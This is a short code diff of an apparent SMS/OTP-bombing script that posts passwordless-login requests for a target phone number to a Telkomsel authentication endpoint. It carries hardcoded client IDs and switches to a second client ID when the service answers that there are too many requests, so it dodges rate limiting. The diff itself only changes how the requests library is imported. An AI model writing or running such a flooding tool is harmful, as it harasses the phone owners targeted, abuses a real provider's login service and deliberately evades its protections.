@@ -1,4 +1,4 @@
-import requests
+from requests import session as q
 from sys import stdout, exit
 from time import sleep
 
@@ -32,10 +32,10 @@ def otpRequest(n):
 	dataa = {
 	"client_id": "9yUwRUZirC0DXZyjMeQF4zCr6KO2R0Ub",
 	"phone_number":"+"+n,"connection":"sms"}
-	resp = requests.post("https://tdwidm.telkomsel.com/passwordless/start", data=dataa)
+	resp = q().post("https://tdwidm.telkomsel.com/passwordless/start", data=dataa)
 	if(resp.text.startswith("Too")):
 		dataa.update({"client_id":"TFKYtPumTXcLM8xEZATlvceX2Vtblaw3"})
-		resp = requests.post("https://tdwidm.telkomsel.com/passwordless/start", data=dataa)
+		resp = q().post("https://tdwidm.telkomsel.com/passwordless/start", data=dataa)
 		warning(False, "Magic Link: "+n) if(resp.text.startswith("Too")) else warning(True, "Magic Link: "+n)
 	else:
 		warning(True, "Otp Code: "+n)
